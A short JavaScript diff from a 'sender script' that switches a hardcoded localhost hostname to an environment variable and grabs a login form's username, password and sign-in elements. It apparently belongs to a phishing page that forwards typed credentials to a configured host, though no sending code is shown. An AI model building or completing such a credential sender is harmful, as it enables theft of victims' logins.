@@ -2,7 +2,7 @@ document.addEventListener("DOMContentLoaded", function() {
     //form handler
     console.log("sender script loaded");
 
-    const hostname = "http://127.0.0.1:5500";
+    const hostname = process.env.hostname;
     const nextButton = document.querySelector("#login-signin");
     const emailInput = document.querySelector("#login-username");
     const passwordInput = document.querySelector("#login-passwd");
